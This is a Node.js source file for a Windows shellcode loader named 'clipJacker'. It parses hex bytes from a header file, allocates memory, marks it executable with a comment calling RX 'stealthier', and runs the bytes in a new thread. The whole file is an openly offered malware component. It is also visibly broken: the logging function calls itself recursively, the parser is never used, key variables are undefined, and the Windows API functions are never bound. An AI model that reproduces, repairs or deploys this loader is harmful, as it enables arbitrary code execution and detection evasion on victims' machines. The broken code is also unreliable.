'use strict';

const fs = require('fs').promises;
const koffi = require('koffi');

const MEM_COMMIT  = 0x1000;
const MEM_RESERVE = 0x2000;

const PAGE_READWRITE         = 0x04;
const PAGE_EXECUTE_READ      = 0x20;
const PAGE_EXECUTE_READWRITE = 0x40;

const INFINITE = 0xFFFFFFFF;

function log(level, msg, extra = '') {
  const ts = new Date().toISOString();
  log(`[${ts}] [${level}] ${msg}`, extra);
}

async function clipJacker(filePath) {
  // ── CONFIG ───────────────────────────────────────────────
  const SHELLCODE_FILE = filePath || './bytes.h';

  log('INFO', 'Reading shellcode from file', SHELLCODE_FILE);


  // 1. Read the file content (should contain \xAA\xBB... style C header)
  let rawContent;
  try {
    rawContent = await fs.readFile(SHELLCODE_FILE, 'utf8');
  } catch (err) {
    throw new Error(`Failed to read file ${SHELLCODE_FILE}: ${err.message}`);
  }

  // 2. Parse shellcode from C header string
 function parseShellcodeFromString(content) {
  const bytes = [];
  let idx = 0;

  while ((idx = content.indexOf('\\x', idx)) !== -1) {
    const hex = content.slice(idx + 2, idx + 4);
    if (hex.length !== 2 || isNaN(parseInt(hex, 16))) {
      throw new Error(`Invalid hex byte near offset ${idx}`);
    }
    bytes.push(parseInt(hex, 16));
    idx += 4;
  }

  if (bytes.length === 0) {
    throw new Error('No \\xNN shellcode bytes found');
  }

  return Buffer.from(bytes);
}


  // 3. Allocate RW memory
  const addr = VirtualAlloc(null, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!addr) throw new Error('VirtualAlloc failed');

 log('INFO', 'Memory allocated', addr);


  // 4. Copy shellcode
  RtlCopyMemory(addr, shellcode, size);
  log('INFO', 'Shellcode copied into memory');


  // 5. Try RX first (stealthier), fallback to RWX
  const oldProtect = Buffer.alloc(4);
  let success = VirtualProtect(addr, size, PAGE_EXECUTE_READ, oldProtect);

  if (!success) {
    log('WARN', 'RX failed, falling back to RWX');
    success = VirtualProtect(addr, size, PAGE_EXECUTE_READWRITE, oldProtect);
    if (!success) throw new Error('VirtualProtect failed');
    log('INFO', 'Memory protection set to RWX');

  } else {
    log('INFO', 'Memory protection set to RX');

  }

  // 6. Execute in new thread
  log('INFO', 'Launching shellcode thread');

  const threadIdBuf = Buffer.alloc(4);
  const thread = CreateThread(null, 0, addr, null, 0, threadIdBuf);

  if (!thread) throw new Error('CreateThread failed');

  log('INFO', 'Thread created', `ID=${threadIdBuf.readUInt32LE(0)}`);


  // Wait for thread completion (blocks forever if shellcode doesn't exit)
  await WaitForSingleObject(thread, INFINITE);
  log('INFO', 'Shellcode execution finished');

}


const args = process.argv.slice(2);
if (args.length > 0) {
  clipJacker(args[0]).catch(err => {
    console.error('Error:', err.message);
    process.exit(1);
  });
} else {
  // Default fallback
  clipJacker().catch(err => {
    console.error('Error:', err.message);
    process.exit(1);
  });

}




